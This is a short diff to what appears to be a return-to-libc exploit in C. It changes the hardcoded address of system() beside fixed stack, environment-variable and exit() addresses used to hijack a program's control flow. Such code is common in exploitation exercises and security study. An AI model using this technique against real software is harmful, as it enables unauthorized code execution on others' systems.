@@ -19,7 +19,7 @@ static char addr[] = "\x86\xfb\xff\xbf";
 
 static char env_addr[] = "\xb9\xff\xff\xbf";
 
-static char system_addr[] = "\xa0\xd3\xe4\xb7";
+static char system_addr[] = "\xa0\x3d\xe4\xb7";
 
 static char exit_addr[] = "\xd0\x79\xe3\xb7";
 
